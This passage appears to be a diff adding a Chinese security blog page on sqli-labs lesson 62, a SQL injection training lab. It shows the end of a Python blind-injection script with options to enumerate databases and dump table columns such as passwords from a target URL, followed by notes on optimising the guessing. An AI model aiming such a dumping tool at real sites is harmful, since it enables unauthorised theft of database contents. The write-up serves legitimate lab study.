+            data = get_data(url, column, tbname, dbname, i)
+            datas.append(data)
+        datas.append('.')
+
+    res = [s.split() for s in ' '.join(datas).split('.') if s]
+
+    for i in res:
+        for j in i:
+            print('%-15s' % j, end='')
+        print(&quot;\n&quot;)
+
+
+def main():
+    parser = OptionParser()
+    parser.add_option('-u', '--url', type='string', dest='url',
+                      help='Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)')
+    parser.add_option('-D', type='string', dest='db',
+                      help='DBMS database to enumerate')
+    parser.add_option('-T', type='string', dest='tbl',
+                      help='DBMS database table(s) to enumerate')
+    parser.add_option('-C', type='string', dest='col',
+                      help='DBMS database table column(s) to enumerate, use like id,password')
+    parser.add_option('--current-db', action='store_true',
+                      dest='cudbs', help='Retrieve DBMS current database')
+    parser.add_option('--dbs', action='store_true',
+                      dest='dbs', help='Enumerate ALL database')
+    parser.add_option('--tables', action='store_true',
+                      dest='tables', help='Enumerate DBMS database tables')
+    parser.add_option('--columns', action='store_true',
+                      dest='columns', help='Enumerate DBMS database table columns')
+    parser.add_option('--dump', action='store_true',
+                      dest='dump', help='Dump DBMS database table entries')
+    parser.add_option('--dump-all', action='store_true',
+                      dest='all', help='Dump all DBMS databases tables entries')
+    (options, args) = parser.parse_args()
+
+    if options.url and options.dbs:
+        url = options.url
+        getdbname(url)
+    elif options.url and options.cudbs:
+        url = options.url
+        get_cu_db_name(url)
+    elif options.url and options.db and options.tables:
+        url = options.url
+        dbname = options.db
+        get_table_name(url, dbname)
+    elif (options.url and options.db and options.tbl and options.col and options.dump):
+        url = options.url
+        dbname = options.db
+        tbname = options.tbl
+        coname = options.col
+        dump(url, tbname, dbname, coname)
+    elif (options.url and options.db and options.tbl and options.all):
+        url = options.url
+        dbname = options.db
+        tbname = options.tbl
+        dump(url, tbname, dbname)
+    elif (options.url and options.db and options.tbl and options.columns):
+        url = options.url
+        dbname = options.db
+        tbname = options.tbl
+        get_column_name(url, tbname, dbname)
+    else:
+        parser.print_help()
+
+
+if __name__ == '__main__':
+    main()
+
+</code></pre><p>解决的思路方向,优化脚本。</p>
+<p>1.其中一项是secret_XXXX 后四位由 大写字母和数字 组成,可以只猜解后这四位
+2.发现大小写字母和数字组成,可以缩小区域
+3.优化算法..脚本中有些请求是不必要的
+4.直接默认猜解challenges？</p>
+<p>暂时想到这么多...</p>
+</div>
+
+        </article>
+
+        
+
+        
+
+        
+    <div class="updated-badge-container"><div title="Updated @ 2020-01-25 23:51:33 CST" style="cursor:help;display:inline-block">
+
+<svg xmlns="http://www.w3.org/2000/svg" width="130" height="20" class="updated-badge"><linearGradient id="b" x2="0" y2="100%"><stop offset="0" stop-color="#bbb" stop-opacity=".1"/><stop offset="1" stop-opacity=".1"/></linearGradient><clipPath id="a"><rect width="130" height="20" rx="3" fill="#fff"/></clipPath><g clip-path="url(#a)"><path class="updated-badge-left" d="M0 0h55v20H0z"/><path class="updated-badge-right" d="M55 0h75v20H55z"/><path fill="url(#b)" d="M0 0h130v20H0z"/></g><g fill="#fff" text-anchor="middle" font-size="110"><text x="285" y="150" fill="#010101" fill-opacity=".3" textLength="450" transform="scale(.1)">updated</text><text x="285" y="140" textLength="450" transform="scale(.1)">updated</text><text x="915" y="150" fill="#010101" fill-opacity=".3" textLength="650" transform="scale(.1)">2020-01-25</text><text x="915" y="140" textLength="650" transform="scale(.1)">2020-01-25</text></g></svg></div></div>
+
+
+        
+
+        
+    
+    
+        <div class="related-posts">
+            <h2 class="related-title">相关文章：<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon related-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm144 276c0 6.6-5.4 12-12 12h-92v92c0 6.6-5.4 12-12 12h-56c-6.6 0-12-5.4-12-12v-92h-92c-6.6 0-12-5.4-12-12v-56c0-6.6 5.4-12 12-12h92v-92c0-6.6 5.4-12 12-12h56c6.6 0 12 5.4 12 12v92h92c6.6 0 12 5.4 12 12v56z"/></svg></h2>
+            <ul class="related-list">
+                
+                    <li class="related-item">
+                        <a href="/others/sqli-labs-lession-65-get-%E7%9B%B2%E6%B3%A8-%E5%8F%98%E5%8C%964-%E4%BB%85%E5%85%81%E8%AE%B8130%E6%AC%A1%E8%AF%B7%E6%B1%82/" class="related-link">sqli-labs lession-65 GET-盲注-变化4-仅允许130次请求</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/others/sqli-labs-lession-64-get-%E7%9B%B2%E6%B3%A8-%E5%8F%98%E5%8C%963-%E4%BB%85%E5%85%81%E8%AE%B8130%E6%AC%A1%E8%AF%B7%E6%B1%82/" class="related-link">sqli-labs lession-64 GET-盲注-变化3-仅允许130次请求</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/others/sqli-labs-lession-63-get-%E7%9B%B2%E6%B3%A8-%E5%8F%98%E5%8C%962-%E4%BB%85%E5%85%81%E8%AE%B8130%E6%AC%A1%E8%AF%B7%E6%B1%82/" class="related-link">sqli-labs lession-63 GET-盲注-变化2-仅允许130次请求</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/others/sqli-labs-lession-61-get-%E5%8F%8C%E6%B3%A8%E5%85%A5-%E5%8F%98%E5%8C%964-%E4%BB%85%E5%85%81%E8%AE%B85%E6%AC%A1%E8%AF%B7%E6%B1%82/" class="related-link">sqli-labs lession-61 GET-双注入-变化4-仅允许5次请求</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/others/sqli-labs-lession-60-get-%E5%8F%8C%E6%B3%A8%E5%85%A5-%E5%8F%98%E5%8C%963-%E4%BB%85%E5%85%81%E8%AE%B85%E6%AC%A1%E8%AF%B7%E6%B1%82/" class="related-link">sqli-labs lession-60 GET-双注入-变化3-仅允许5次请求</a>
+                    </li>
+                
+            </ul>
+        </div>
+    
+
+
+        
+    
+        <div class="post-tags">
+            
+                
+                
+                
+                
+                    
+                    <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag" class="post-tags-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon tag-icon"><path d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"/></svg>SQL注入</a>
+                
+            
+                
+                
+                
+                
+                    
+                    <a href="/tags/sqli-labs/" rel="tag" class="post-tags-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon tag-icon"><path d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"/></svg>sqli-labs</a>
+                
+            
+        </div>
+    
+
+
+        
+    <footer class="minimal-footer">
+        
+            
+            <div class="post-tag"><a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag" class="post-tag-link">#sql注入</a> <a href="/tags/sqli-labs/" rel="tag" class="post-tag-link">#sqli-labs</a></div>
+        
+        
+            <div class="post-category">
+                <a href="/others/" class="post-category-link active">others</a> | <a href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category-link">渗透测试</a> | <a href="/%E9%87%8D%E7%82%B9%E6%BC%8F%E6%B4%9E/" class="post-category-link">重点漏洞</a> | 
+            </div>
+        
+        
+    </footer>
+
+
+        
+
+        
+    
+        
+        
+    
+    
+    
+    
+        <ul class="post-nav">
+            
+                <li class="post-nav-prev">
+                    <a href="/others/sqli-labs-lession-63-get-%E7%9B%B2%E6%B3%A8-%E5%8F%98%E5%8C%962-%E4%BB%85%E5%85%81%E8%AE%B8130%E6%AC%A1%E8%AF%B7%E6%B1%82/" rel="prev">< sqli-labs lession-63 GET-盲注-变化2-仅允许130次请求</a>
+                </li>
+            
+            
+                <li class="post-nav-next">
+                    <a href="/others/sqli-labs-lession-61-get-%E5%8F%8C%E6%B3%A8%E5%85%A5-%E5%8F%98%E5%8C%964-%E4%BB%85%E5%85%81%E8%AE%B85%E6%AC%A1%E8%AF%B7%E6%B1%82/" rel="next">sqli-labs lession-61 GET-双注入-变化4-仅允许5次请求 ></a>
+                </li>
+            
+        </ul>
+    
+
+
+        
+
+    </div>
+</main>
+
+            
+    <div id="back-to-top" class="back-to-top">
+        <a href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon"><path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6 0-33.9L207 39c9.4-9.4 24.6-9.4 33.9 0l194.3 194.3c9.4 9.4 9.4 24.6 0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3 0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg></a>
+    </div>
+
+            
+        </div>
+        <script src="/js/meme.min.2c1054bb9f34ffed4c73e0352b46f19d70ee6b9948af9d7d464a19117675aee4.js" integrity="sha256-LBBUu580/+1Mc+A1K0bxnXDua5lIr519RkoZEXZ1ruQ=" data-no-instant></script>
+
+
+    <script data-no-instant>InstantClick.init();</script>
+
+
+    <script data-no-instant>
+        InstantClick.on('change', function () {
+            backToTop();
+        });
+    </script>
+
+
+<script data-no-instant>
+            InstantClick.on('change', function () {
+                gtag('config', '', {
+                    'page_path': location.pathname + location.search
+                });
+            });
+        </script>
+    
+    
+    <script src="https://cdn.jsdelivr.net/gh/cferdinandi/smooth-scroll/dist/smooth-scroll.polyfills.min.js"></script>
+
+<script>
+    var scroll = new SmoothScroll('a[href*="#"]', {
+        speedAsDuration: true
+    });
+</script>
+
+
+
+
+
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/medium-zoom@latest/dist/medium-zoom.min.js"></script>
+
+<script>
+    mediumZoom('[data-zoomable]', {
+        background: 'hsla(var(--color-bg-h), var(--color-bg-s), var(--color-bg-l), 0.95)'
+    })
+</script>
+
+
+
+
+
+
+
+
+
+    </body>
+</html>
